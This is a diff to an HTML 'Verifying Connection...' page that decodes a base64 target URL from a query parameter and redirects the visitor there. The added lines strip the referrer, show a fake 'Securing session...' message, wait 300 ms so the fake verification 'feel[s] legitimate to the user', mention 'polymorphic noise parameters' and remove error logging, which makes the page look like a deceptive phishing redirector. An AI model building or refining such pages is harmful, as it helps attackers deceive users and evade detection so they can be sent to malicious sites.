@@ -3,35 +3,43 @@
 <head>
     <meta charset="UTF-8">
     <title>Verifying Connection...</title>
+    <meta name="referrer" content="no-referrer">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
         body { 
-            font-family: sans-serif; 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
             display: flex; 
+            flex-direction: column;
             justify-content: center; 
             align-items: center; 
             height: 100vh; 
-            background: #f4f4f4; 
+            background: #ffffff; 
             margin: 0;
+            color: #333;
         }
         .loader { 
-            border: 4px solid #f3f3f3; 
-            border-top: 4px solid #3498db; 
+            border: 3px solid #f3f3f3; 
+            border-top: 3px solid #3498db; 
             border-radius: 50%; 
-            width: 30px; 
-            height: 30px; 
-            animation: spin 2s linear infinite; 
+            width: 24px; 
+            height: 24px; 
+            animation: spin 1s linear infinite; 
+            margin-bottom: 15px;
         }
         @keyframes spin { 
             0% { transform: rotate(0deg); } 
             100% { transform: rotate(360deg); } 
         }
+        .status-text { font-size: 14px; color: #666; }
     </style>
 </head>
 <body>
     <div class="loader"></div>
+    <div class="status-text">Securing session...</div>
+
     <script>
         (function() {
+            // URLSearchParams ignores the polymorphic noise parameters automatically
             const params = new URLSearchParams(window.location.search);
             let token = params.get('t');
             
@@ -45,19 +53,24 @@
                         token += '=';
                     }
                     
-                    // 3. Decode and redirect
+                    // 3. Decode
                     const target = atob(token);
+                    
+                    // 4. Validate and Redirect
                     if (target.startsWith('http')) {
-                        window.location.replace(target);
+                        // Small delay (300ms) to allow the loader to be visible, 
+                        // making the "verification" feel legitimate to the user
+                        setTimeout(() => {
+                            window.location.replace(target);
+                        }, 300);
                     } else {
                         throw new Error("Invalid Protocol");
                     }
                 } catch (e) {
-                    console.error("Redirect error:", e);
-                    document.body.innerHTML = "Verification link expired or invalid.";
+                    document.body.innerHTML = "Verification link expired. Please request a new one.";
                 }
             } else {
-                document.body.innerHTML = "No security token found.";
+                document.body.innerHTML = "Authentication required.";
             }
         })();
     </script>
